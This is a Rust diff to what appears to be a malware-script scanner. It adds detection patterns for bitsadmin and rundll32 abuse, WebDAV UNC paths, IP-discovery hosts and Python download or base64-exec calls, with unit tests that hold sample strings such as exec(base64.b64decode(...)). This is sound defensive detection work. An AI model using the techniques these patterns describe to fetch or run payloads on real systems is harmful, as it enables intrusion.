@@ -7,11 +7,12 @@
 
 #![allow(clippy::expect_used, clippy::type_complexity, clippy::unwrap_used)]
 
-use crate::env::Environment;
-use crate::handlers::util::split_words;
+use crate::env::{Config, Environment};
+use crate::handlers::util::{flag_url_value_after, split_words};
 use crate::traits::Trait;
 use once_cell::sync::Lazy;
 use regex::Regex;
+use std::collections::HashMap;
 
 #[allow(clippy::expect_used)]
 // Case-insensitive AND tolerant of Windows' liberal slash normalization:
@@ -36,6 +37,25 @@ static UNC_WEBDAV_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static BARE_UNC_WEBDAV_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r#"(?i)\\\\([A-Za-z0-9.\-]+)\\webdav\\[^\s"'<>(){}\[\]|^&;`,]+"#)
+        .expect("bare unc webdav regex")
+});
+
+static IP_DISCOVERY_HOSTS: &[&str] = &[
+    "api.ipify.org",
+    "ipv4.icanhazip.com",
+    "icanhazip.com",
+    "checkip.dyndns.org",
+    "checkip.amazonaws.com",
+    "ifconfig.me",
+    "ip-api.com",
+    "ipinfo.io",
+    "www.geoplugin.net",
+    "reallyfreegeoip.org",
+];
+
+#[allow(clippy::expect_used)]
 static BITSADMIN_WORD_RE: Lazy<Regex> =
     Lazy::new(|| Regex::new(r"(?i)\bbitsadmin(?:\.exe)?\b").expect("bitsadmin word regex"));
 
@@ -48,11 +68,43 @@ static CMD_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static CMD_SCHEMELESS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?i)\bset\s+"?([A-Za-z_][A-Za-z0-9_.$-]*url[A-Za-z0-9_.$-]*)\s*=\s*['"]?([A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+/[^\s"']+)"#,
+    )
+    .expect("cmd schemeless URL variable regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?i)(?:^|[^\w])\$([A-Za-z_][A-Za-z0-9_]*)\s*=\s*["']((?:https?|ftp|file):[\x2f\x5c]+[^"']+)["']"#,
     )
     .expect("PowerShell URL variable regex")
+});
+
+#[allow(clippy::expect_used)]
+static PS_SCHEMELESS_URL_VAR_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?i)(?:^|[^\w])\$([A-Za-z_][A-Za-z0-9_]*url[A-Za-z0-9_]*)\s*=\s*["']([A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+/[^"']+)["']"#,
+    )
+    .expect("PowerShell schemeless URL variable regex")
+});
+
+#[allow(clippy::expect_used)]
+static GLUED_RUNDLL32_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?i)(?:^|[^A-Za-z0-9_.-])(rundll32([A-Za-z0-9_.~$%{}\\/:-]{1,260}\.[A-Za-z0-9]{2,8})\s*,\s*[A-Za-z0-9_#@$.-]{1,80})"#,
+    )
+    .expect("glued rundll32 regex")
+});
+
+#[allow(clippy::expect_used)]
+static SPACED_RUNDLL32_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?i)(?:^|[&|;]\s*)(rundll32(?:\.exe)?\s+(?:"([^"\r\n]+)"|([^"'\s\r\n,]+))\s*,\s*[A-Za-z0-9_#@$.-]{1,80})"#,
+    )
+    .expect("spaced rundll32 regex")
 });
 
 #[allow(clippy::expect_used)]
@@ -267,6 +319,10 @@ const NOISE_URL_SUBSTRINGS: &[&str] = &[
     "crl.digicert.com",
     "ocsp.usertrust.com",
     "crl.usertrust.com",
+    "www.usertrust.com",
+    "ocsp2.globalsign.com",
+    "secure.globalsign.com/cacert/",
+    "globalsign.com/repository/",
     "crl.microsoft.com",
     "ocsp.microsoft.com",
     "microsoft.com/pki/certs/",
@@ -303,13 +359,30 @@ const NOISE_URL_SUBSTRINGS: &[&str] = &[
     "w3.org/xml/1998/namespace",
     "schemas.microsoft.com/",
     "schemas.dmtf.org/wbem/wsman/",
+    "schemas.openxmlformats.org/markup-compatibility/",
     "iptc.org/std/",
     "xmp.gettyimages.com/",
     "ns.useplus.org/",
+    "aiim.org/pdfa/ns/",
     "red-gate.com/products/dotnet-development/smartassembly",
+    "www.smartassembly.com/webservices/",
+    "chiark.greenend.org.uk/~sgtatham/putty/",
+    "tempuri.org/",
+    "autoitscript.com/autoit3/",
     // Stock photo / template attribution
+    "commons.wikimedia.org/wiki/file:",
+    "www.iec.ch",
     "istockphoto.com/legal/license-agreement",
     "istockphoto.com/photo/license",
+    // UI resource templates / app about-box links in recovered binaries
+    "www.youtube.com/embed/",
+    "player.vimeo.com/video/",
+    "ok.ru/videoembed/",
+    "music.yandex.ru/iframe/",
+    "www.google.com/maps/place/",
+    "sourceforge.net/p/compactview",
+    "www.cyotek.com",
+    "www.skinstudio.net",
     // Common ad networks / analytics in legitimate page assets
     "doubleclick.net",
     "googletagmanager.com",
@@ -372,6 +445,22 @@ fn strip_quotes(s: &str) -> &str {
     }
 }
 
+fn trim_html_quote_entity_suffix(mut token: &str) -> &str {
+    loop {
+        let Some(trimmed) = token
+            .strip_suffix("&quot")
+            .or_else(|| token.strip_suffix("&apos"))
+            .or_else(|| token.strip_suffix("&#039"))
+            .or_else(|| token.strip_suffix("&#34"))
+            .or_else(|| token.strip_suffix("&#x27"))
+            .or_else(|| token.strip_suffix("&#X27"))
+        else {
+            return token;
+        };
+        token = trimmed;
+    }
+}
+
 pub(crate) fn normalize_liberal_url_token(token: &str) -> Option<String> {
     let mut token = token.trim().trim_matches(['"', '\'']);
     let end = token
@@ -384,6 +473,7 @@ pub(crate) fn normalize_liberal_url_token(token: &str) -> Option<String> {
         .unwrap_or(token.len());
     token = &token[..end];
     token = token.trim_end_matches(['.', ',', ';', ':', '\\']);
+    token = trim_html_quote_entity_suffix(token);
 
     let lower = token.to_ascii_lowercase();
     for scheme in ["http", "https", "ftp", "file"] {
@@ -421,6 +511,7 @@ pub(crate) fn normalize_liberal_url_token(token: &str) -> Option<String> {
 pub(crate) fn normalize_schemeless_domain_path_token(token: &str) -> Option<String> {
     let token = strip_quotes(token).trim();
     let token = token.trim_end_matches(['.', ',', ';', ':', '\\']);
+    let token = trim_html_quote_entity_suffix(token);
     let (host, path) = token.split_once('/')?;
     if host.is_empty() || path.is_empty() || host.contains('\\') || host.contains(':') {
         return None;
@@ -460,16 +551,21 @@ fn scan_bitsadmin_deob_text(deobfuscated: &str, env: &mut Environment) {
 
     for line in deobfuscated.lines() {
         let lower = line.to_ascii_lowercase();
-        if !lower.contains("/transfer") || !lower.contains("bitsadmin") {
+        if !(lower.contains("/transfer") || lower.contains("/addfile"))
+            || !lower.contains("bitsadmin")
+        {
             continue;
         }
 
         for bits_match in BITSADMIN_WORD_RE.find_iter(line) {
             let tail = &line[bits_match.start()..];
-            let segment = tail.split('&').next().unwrap_or(tail);
+            let segment = first_unquoted_ampersand_segment(tail);
             let tokens = split_words(segment);
             let lower_tokens: Vec<String> = tokens.iter().map(|s| s.to_ascii_lowercase()).collect();
-            if !lower_tokens.iter().any(|t| t == "/transfer") {
+            if !lower_tokens
+                .iter()
+                .any(|t| t == "/transfer" || t == "/addfile")
+            {
                 continue;
             }
 
@@ -493,6 +589,7 @@ fn scan_bitsadmin_deob_text(deobfuscated: &str, env: &mut Environment) {
                         .map(|s| strip_quotes(s).to_string())
                         .unwrap_or_default();
                     if known.insert(url.clone()) {
+                        push_lolbas_once(env, "bitsadmin", line);
                         env.traits.push(Trait::BitsadminDownload { url, dst });
                     }
                     i += 2;
@@ -504,7 +601,48 @@ fn scan_bitsadmin_deob_text(deobfuscated: &str, env: &mut Environment) {
     }
 }
 
+fn first_unquoted_ampersand_segment(text: &str) -> &str {
+    let mut in_dq = false;
+    let mut in_sq = false;
+    for (idx, c) in text.char_indices() {
+        if c == '"' && !in_sq {
+            in_dq = !in_dq;
+            continue;
+        }
+        if c == '\'' && !in_dq {
+            in_sq = !in_sq;
+            continue;
+        }
+        if c == '&' && !in_dq && !in_sq {
+            return &text[..idx];
+        }
+    }
+    text
+}
+
 fn scan_python_requests_get_deob_text(deobfuscated: &str, env: &mut Environment) {
+    let has_direct_download = has_python_direct_download_scan_atom(deobfuscated);
+    let has_base64_decode = has_python_base64_decode_scan_atom(deobfuscated);
+    if !has_direct_download && !has_base64_decode {
+        return;
+    }
+    let python_profile_enabled = std::env::var_os("HARRINGTON_PROFILE_PYTHON_SCAN").is_some();
+    macro_rules! profile_python_group {
+        ($stage:literal, $body:block) => {{
+            let profile_start = python_profile_enabled.then(std::time::Instant::now);
+            let result = $body;
+            if let Some(profile_start) = profile_start {
+                eprintln!(
+                    "harrington_profile_python_scan stage={} delta_ms={} bytes={}",
+                    $stage,
+                    profile_start.elapsed().as_millis(),
+                    deobfuscated.len()
+                );
+            }
+            result
+        }};
+    }
+
     let mut known: std::collections::HashSet<String> = env
         .traits
         .iter()
@@ -514,16 +652,1242 @@ fn scan_python_requests_get_deob_text(deobfuscated: &str, env: &mut Environment)
         })
         .collect();
 
-    for url in find_call_url_literals(
-        deobfuscated,
-        &["requests.get", "urllib.request.urlopen", "urllib.urlopen"],
-    ) {
-        emit_python_download(&url, deobfuscated, env, &mut known);
+    if has_direct_download {
+        profile_python_group!("direct_urlopen_get", {
+            let urlopen_names = python_urlopen_call_names(deobfuscated);
+            let urlopen_name_refs = urlopen_names.iter().map(String::as_str).collect::<Vec<_>>();
+            for url in find_call_url_literals(deobfuscated, &urlopen_name_refs) {
+                emit_python_download(&url, deobfuscated, env, &mut known);
+            }
+        });
+        profile_python_group!("direct_request", {
+            for url in find_python_requests_request_literals(deobfuscated) {
+                emit_python_download(&url, deobfuscated, env, &mut known);
+            }
+        });
+        profile_python_group!("direct_urlretrieve", {
+            for (url, dst) in find_python_urlretrieve_literals(deobfuscated) {
+                emit_python_download_with_dst(&url, dst.as_deref(), deobfuscated, env, &mut known);
+            }
+        });
     }
+
+    if has_base64_decode {
+        let decoded_payloads = profile_python_group!("decode_b64_literals", {
+            decoded_python_b64decode_literals(deobfuscated)
+        });
+        profile_python_group!("decoded_payload_scan", {
+            for decoded in decoded_payloads {
+                let decoded_urlopen_names = python_urlopen_call_names(&decoded);
+                let decoded_urlopen_name_refs = decoded_urlopen_names
+                    .iter()
+                    .map(String::as_str)
+                    .collect::<Vec<_>>();
+                for url in find_call_url_literals(&decoded, &decoded_urlopen_name_refs) {
+                    emit_python_download(&url, &decoded, env, &mut known);
+                }
+                for url in find_python_requests_request_literals(&decoded) {
+                    emit_python_download(&url, &decoded, env, &mut known);
+                }
+                for (url, dst) in find_python_urlretrieve_literals(&decoded) {
+                    emit_python_download_with_dst(&url, dst.as_deref(), &decoded, env, &mut known);
+                }
+            }
+        });
+    }
+}
+
+#[cfg(test)]
+fn has_python_download_scan_atom(text: &str) -> bool {
+    has_python_direct_download_scan_atom(text) || has_python_base64_decode_scan_atom(text)
+}
+
+fn has_python_direct_download_family_atom(text: &str) -> bool {
+    ["request", "httpx", "urllib", "urlopen", "urlretrieve"]
+        .iter()
+        .any(|atom| find_ascii_case_insensitive(text, atom, 0).is_some())
+}
+
+fn has_python_direct_download_scan_atom(text: &str) -> bool {
+    if !has_python_direct_download_family_atom(text) {
+        return false;
+    }
+    [
+        "requests.get",
+        "requests.post",
+        "requests.put",
+        "requests.patch",
+        "requests.delete",
+        "requests.head",
+        "requests.options",
+        "requests.request",
+        "httpx.get",
+        "httpx.post",
+        "httpx.put",
+        "httpx.patch",
+        "httpx.delete",
+        "httpx.head",
+        "httpx.options",
+        "httpx.request",
+        "httpx.client",
+        "urllib.",
+        "urlopen(",
+        "urlretrieve(",
+        "import requests",
+        "import httpx",
+        "import urllib",
+        "from requests",
+        "from httpx",
+        "from urllib",
+        "__import__('requests')",
+        "__import__(\"requests\")",
+        "__import__('httpx')",
+        "__import__(\"httpx\")",
+        "__import__('urllib')",
+        "__import__(\"urllib\")",
+    ]
+    .iter()
+    .any(|atom| find_ascii_case_insensitive(text, atom, 0).is_some())
+}
+
+fn has_python_base64_decode_scan_atom(text: &str) -> bool {
+    ["b64decode", "urlsafe_b64decode"]
+        .iter()
+        .any(|atom| find_ascii_case_insensitive(text, atom, 0).is_some())
+}
+
+#[cfg(test)]
+mod python_download_prefilter_tests {
+    use super::{has_python_direct_download_family_atom, has_python_download_scan_atom};
+
+    #[test]
+    fn prefilter_allows_direct_download_apis() {
+        assert!(has_python_download_scan_atom(
+            "import requests; requests.get('https://example.test/p')"
+        ));
+        assert!(has_python_download_scan_atom(
+            "urllib.request.urlopen('https://example.test/p')"
+        ));
+    }
+
+    #[test]
+    fn prefilter_allows_python_base64_decoders() {
+        assert!(has_python_download_scan_atom(
+            "exec(base64.b64decode('aW1wb3J0IHVybGxpYg=='))"
+        ));
+        assert!(has_python_download_scan_atom(
+            "from base64 import b64decode as dec; exec(dec(payload))"
+        ));
+        assert!(has_python_download_scan_atom(
+            "exec(base64.urlsafe_b64decode(payload))"
+        ));
+    }
+
+    #[test]
+    fn prefilter_blocks_base64_import_without_decoder() {
+        assert!(!has_python_download_scan_atom(
+            "import base64; print(base64.standard_b64encode(b'data'))"
+        ));
+    }
+
+    #[test]
+    fn prefilter_blocks_html_prose_with_python_words() {
+        assert!(!has_python_download_scan_atom(
+            r#"<a href="/pulls">Pull requests</a><link href="https://example.test/urllib-doc.css">"#
+        ));
+    }
+
+    #[test]
+    fn direct_family_prefilter_blocks_python_and_urls_without_download_apis() {
+        assert!(!has_python_direct_download_family_atom(
+            "python http://example.test/a ".repeat(128).as_str()
+        ));
+        assert!(has_python_direct_download_family_atom(
+            "import requests; requests.get('https://example.test/p')"
+        ));
+        assert!(has_python_direct_download_family_atom(
+            "urllib.request.urlopen('https://example.test/p')"
+        ));
+        assert!(has_python_direct_download_family_atom(
+            "import httpx; httpx.Client().get('https://example.test/p')"
+        ));
+    }
+}
+
+fn python_urlopen_call_names(text: &str) -> Vec<String> {
+    let mut names = vec![
+        "requests.get".to_string(),
+        "httpx.get".to_string(),
+        "urllib.request.urlopen".to_string(),
+        "urllib.urlopen".to_string(),
+    ];
+    for method in ["get", "post", "put", "patch", "delete", "head", "options"] {
+        if method != "get" {
+            names.push(format!("requests.{method}"));
+            names.push(format!("httpx.{method}"));
+        }
+        names.extend(collect_python_httpx_method_aliases(text, method));
+        names.extend(collect_python_httpx_client_method_aliases(text, method));
+        names.extend(collect_python_httpx_bound_client_method_aliases(
+            text, method,
+        ));
+        names.extend(collect_python_httpx_bound_client_assigned_method_aliases(
+            text, method,
+        ));
+        names.extend(collect_python_requests_method_aliases(text, method));
+        names.extend(collect_python_requests_session_method_aliases(text, method));
+        names.extend(collect_python_requests_bound_session_method_aliases(
+            text, method,
+        ));
+    }
+    names.extend(collect_python_urllib_call_aliases(text, "urlopen"));
+    names
+}
+
+fn collect_python_httpx_method_aliases(text: &str, target_method: &str) -> Vec<String> {
+    if !contains_ascii_case_insensitive_atom(text, b"httpx") {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_FROM_HTTPX_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bfrom\s+httpx\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
+            .expect("python httpx from import regex")
+    });
+
+    let module_aliases = collect_python_httpx_module_aliases(text);
+    let mut aliases: Vec<String> = module_aliases
+        .iter()
+        .map(|alias| format!("{alias}.{target_method}"))
+        .collect();
+    for caps in PY_FROM_HTTPX_IMPORT_RE.captures_iter(text).take(8) {
+        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
+            continue;
+        };
+        for part in imports.split(',') {
+            let part = part.trim().trim_matches(['(', ')']);
+            let words: Vec<&str> = part.split_ascii_whitespace().collect();
+            let Some(method) = words.first().copied() else {
+                continue;
+            };
+            if method != target_method {
+                continue;
+            }
+            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
+                words.get(2).copied().unwrap_or(method)
+            } else {
+                method
+            };
+            if is_python_identifier(alias) {
+                aliases.push(alias.to_string());
+            }
+        }
+    }
+    aliases.extend(collect_python_httpx_assigned_method_aliases(
+        text,
+        target_method,
+        &module_aliases,
+    ));
+    aliases
+}
+
+fn collect_python_httpx_assigned_method_aliases(
+    text: &str,
+    target_method: &str,
+    module_aliases: &[String],
+) -> Vec<String> {
+    if !text.as_bytes().contains(&b'=') {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_HTTPX_METHOD_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\.(get|post|put|patch|delete|head|options)\b"#)
+            .expect("python httpx method assignment regex")
+    });
+
+    PY_HTTPX_METHOD_ASSIGN_RE
+        .captures_iter(text)
+        .take(8)
+        .filter_map(|caps| {
+            let alias = caps.get(1)?.as_str();
+            let module = caps.get(2)?.as_str();
+            let method = caps.get(3)?.as_str();
+            if method == target_method && module_aliases.iter().any(|known| known == module) {
+                Some(alias.to_string())
+            } else {
+                None
+            }
+        })
+        .collect()
+}
+
+fn collect_python_httpx_module_aliases(text: &str) -> Vec<String> {
+    #[allow(clippy::expect_used)]
+    static PY_IMPORT_HTTPX_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bimport\s+httpx\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
+            .expect("python httpx import alias regex")
+    });
+
+    let mut aliases = vec!["httpx".to_string()];
+    aliases.extend(
+        PY_IMPORT_HTTPX_ALIAS_RE
+            .captures_iter(text)
+            .take(8)
+            .filter_map(|caps| caps.get(1).map(|m| m.as_str().to_string())),
+    );
+    aliases
+}
+
+fn collect_python_httpx_client_method_aliases(text: &str, target_method: &str) -> Vec<String> {
+    if !contains_ascii_case_insensitive_atom(text, b"client") {
+        return Vec::new();
+    }
+
+    collect_python_httpx_client_constructors(text)
+        .into_iter()
+        .map(|constructor| format!("{constructor}().{target_method}"))
+        .collect()
+}
+
+fn collect_python_httpx_client_constructors(text: &str) -> Vec<String> {
+    if !contains_ascii_case_insensitive_atom(text, b"client") {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_FROM_HTTPX_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bfrom\s+httpx\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
+            .expect("python httpx from import regex")
+    });
+
+    let mut constructors: Vec<String> = collect_python_httpx_module_aliases(text)
+        .into_iter()
+        .map(|alias| format!("{alias}.Client"))
+        .collect();
+    for caps in PY_FROM_HTTPX_IMPORT_RE.captures_iter(text).take(8) {
+        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
+            continue;
+        };
+        for part in imports.split(',') {
+            let part = part.trim().trim_matches(['(', ')']);
+            let words: Vec<&str> = part.split_ascii_whitespace().collect();
+            let Some(imported) = words.first().copied() else {
+                continue;
+            };
+            if imported != "Client" {
+                continue;
+            }
+            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
+                words.get(2).copied().unwrap_or(imported)
+            } else {
+                imported
+            };
+            if is_python_identifier(alias) {
+                constructors.push(alias.to_string());
+            }
+        }
+    }
+    constructors
+}
+
+fn collect_python_httpx_bound_client_method_aliases(
+    text: &str,
+    target_method: &str,
+) -> Vec<String> {
+    collect_python_httpx_bound_client_names(text)
+        .into_iter()
+        .map(|name| format!("{name}.{target_method}"))
+        .collect()
+}
+
+fn collect_python_httpx_bound_client_names(text: &str) -> Vec<String> {
+    if !contains_ascii_case_insensitive_atom(text, b"client") || !text.as_bytes().contains(&b'=') {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_HTTPX_CLIENT_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*(?:\.Client)?)\s*\(\s*\)"#,
+        )
+        .expect("python httpx client assignment regex")
+    });
+
+    let constructors = collect_python_httpx_client_constructors(text);
+    PY_HTTPX_CLIENT_ASSIGN_RE
+        .captures_iter(text)
+        .take(8)
+        .filter_map(|caps| {
+            let name = caps.get(1)?.as_str();
+            let constructor = caps.get(2)?.as_str();
+            if constructors.iter().any(|known| known == constructor) {
+                Some(name.to_string())
+            } else {
+                None
+            }
+        })
+        .collect()
+}
+
+fn collect_python_httpx_bound_client_assigned_method_aliases(
+    text: &str,
+    target_method: &str,
+) -> Vec<String> {
+    if !text.as_bytes().contains(&b'=') {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_HTTPX_BOUND_CLIENT_METHOD_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\.(get|post|put|patch|delete|head|options)\b"#)
+            .expect("python bound httpx client method assignment regex")
+    });
+
+    let clients = collect_python_httpx_bound_client_names(text);
+    PY_HTTPX_BOUND_CLIENT_METHOD_ASSIGN_RE
+        .captures_iter(text)
+        .take(8)
+        .filter_map(|caps| {
+            let alias = caps.get(1)?.as_str();
+            let client = caps.get(2)?.as_str();
+            let method = caps.get(3)?.as_str();
+            if method == target_method && clients.iter().any(|known| known == client) {
+                Some(alias.to_string())
+            } else {
+                None
+            }
+        })
+        .collect()
+}
+
+fn collect_python_requests_method_aliases(text: &str, target_method: &str) -> Vec<String> {
+    let mut aliases = collect_python_requests_call_aliases(text, target_method);
+    aliases.extend(collect_python_requests_assigned_method_aliases(
+        text,
+        target_method,
+    ));
+    aliases
+        .extend(collect_python_requests_bound_session_assigned_method_aliases(text, target_method));
+    aliases
+}
+
+fn collect_python_requests_call_aliases(text: &str, target_method: &str) -> Vec<String> {
+    if !contains_ascii_case_insensitive_atom(text, b"from")
+        && !contains_ascii_case_insensitive_atom(text, b" as ")
+    {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_IMPORT_REQUESTS_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bimport\s+requests\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
+            .expect("python requests import alias regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_FROM_REQUESTS_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bfrom\s+requests\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
+            .expect("python requests from import regex")
+    });
+
+    let mut aliases: Vec<String> = PY_IMPORT_REQUESTS_ALIAS_RE
+        .captures_iter(text)
+        .take(8)
+        .filter_map(|caps| {
+            caps.get(1)
+                .map(|m| format!("{}.{}", m.as_str(), target_method))
+        })
+        .collect();
+    for caps in PY_FROM_REQUESTS_IMPORT_RE.captures_iter(text).take(8) {
+        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
+            continue;
+        };
+        for part in imports.split(',') {
+            let part = part.trim().trim_matches(['(', ')']);
+            let words: Vec<&str> = part.split_ascii_whitespace().collect();
+            let Some(method) = words.first().copied() else {
+                continue;
+            };
+            if method != target_method {
+                continue;
+            }
+            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
+                words.get(2).copied().unwrap_or(method)
+            } else {
+                method
+            };
+            if is_python_identifier(alias) {
+                aliases.push(alias.to_string());
+            }
+        }
+    }
+    aliases
+}
+
+fn collect_python_requests_assigned_method_aliases(text: &str, target_method: &str) -> Vec<String> {
+    if !text.as_bytes().contains(&b'=') {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_REQUESTS_METHOD_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\.(get|post|put|patch|delete|head|options|request)\b"#)
+            .expect("python requests method assignment regex")
+    });
+
+    let module_aliases = collect_python_requests_module_aliases(text);
+    PY_REQUESTS_METHOD_ASSIGN_RE
+        .captures_iter(text)
+        .take(8)
+        .filter_map(|caps| {
+            let alias = caps.get(1)?.as_str();
+            let module = caps.get(2)?.as_str();
+            let method = caps.get(3)?.as_str();
+            if method == target_method && module_aliases.iter().any(|known| known == module) {
+                Some(alias.to_string())
+            } else {
+                None
+            }
+        })
+        .collect()
+}
+
+fn collect_python_requests_module_aliases(text: &str) -> Vec<String> {
+    #[allow(clippy::expect_used)]
+    static PY_IMPORT_REQUESTS_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bimport\s+requests\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
+            .expect("python requests import alias regex")
+    });
+
+    let mut aliases = vec!["requests".to_string()];
+    aliases.extend(
+        PY_IMPORT_REQUESTS_ALIAS_RE
+            .captures_iter(text)
+            .take(8)
+            .filter_map(|caps| caps.get(1).map(|m| m.as_str().to_string())),
+    );
+    aliases
+}
+
+fn collect_python_requests_session_method_aliases(text: &str, target_method: &str) -> Vec<String> {
+    collect_python_requests_session_constructors(text)
+        .into_iter()
+        .map(|constructor| format!("{constructor}().{target_method}"))
+        .collect()
+}
+
+fn collect_python_requests_session_constructors(text: &str) -> Vec<String> {
+    if !contains_ascii_case_insensitive_atom(text, b"session") {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_IMPORT_REQUESTS_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bimport\s+requests\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
+            .expect("python requests import alias regex")
+    });
+    #[allow(clippy::expect_used)]
+    static PY_FROM_REQUESTS_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)\bfrom\s+requests\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
+            .expect("python requests from import regex")
+    });
+
+    let mut constructors = vec!["requests.Session".to_string()];
+    constructors.extend(
+        PY_IMPORT_REQUESTS_ALIAS_RE
+            .captures_iter(text)
+            .take(8)
+            .filter_map(|caps| caps.get(1).map(|m| format!("{}.Session", m.as_str()))),
+    );
+    for caps in PY_FROM_REQUESTS_IMPORT_RE.captures_iter(text).take(8) {
+        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
+            continue;
+        };
+        for part in imports.split(',') {
+            let part = part.trim().trim_matches(['(', ')']);
+            let words: Vec<&str> = part.split_ascii_whitespace().collect();
+            let Some(method) = words.first().copied() else {
+                continue;
+            };
+            if method != "Session" {
+                continue;
+            }
+            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
+                words.get(2).copied().unwrap_or(method)
+            } else {
+                method
+            };
+            if is_python_identifier(alias) {
+                constructors.push(alias.to_string());
+            }
+        }
+    }
+    constructors
+}
+
+fn collect_python_requests_bound_session_method_aliases(
+    text: &str,
+    target_method: &str,
+) -> Vec<String> {
+    collect_python_requests_bound_session_names(text)
+        .into_iter()
+        .map(|name| format!("{name}.{target_method}"))
+        .collect()
+}
+
+fn collect_python_requests_bound_session_names(text: &str) -> Vec<String> {
+    if !contains_ascii_case_insensitive_atom(text, b"session") || !text.as_bytes().contains(&b'=') {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_REQUESTS_SESSION_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(
+            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*(?:\.Session)?)\s*\(\s*\)"#,
+        )
+        .expect("python requests session assignment regex")
+    });
+
+    let constructors = collect_python_requests_session_constructors(text);
+    PY_REQUESTS_SESSION_ASSIGN_RE
+        .captures_iter(text)
+        .take(8)
+        .filter_map(|caps| {
+            let name = caps.get(1)?.as_str();
+            let constructor = caps.get(2)?.as_str();
+            if constructors.iter().any(|known| known == constructor) {
+                Some(name.to_string())
+            } else {
+                None
+            }
+        })
+        .collect()
+}
+
+fn collect_python_requests_bound_session_assigned_method_aliases(
+    text: &str,
+    target_method: &str,
+) -> Vec<String> {
+    if !text.as_bytes().contains(&b'=') {
+        return Vec::new();
+    }
+
+    #[allow(clippy::expect_used)]
+    static PY_REQUESTS_BOUND_SESSION_METHOD_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
+        Regex::new(r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*)\.(get|post|put|patch|delete|head|options|request)\b"#)
+            .expect("python bound requests session method assignment regex")
+    });
+
+    let sessions = collect_python_requests_bound_session_names(text);
+    PY_REQUESTS_BOUND_SESSION_METHOD_ASSIGN_RE
+        .captures_iter(text)
+        .take(8)
+        .filter_map(|caps| {
+            let alias = caps.get(1)?.as_str();
+            let session = caps.get(2)?.as_str();
+            let method = caps.get(3)?.as_str();
+            if method == target_method && sessions.iter().any(|known| known == session) {
+                Some(alias.to_string())
+            } else {
+                None
+            }
+        })
+        .collect()
+}
+
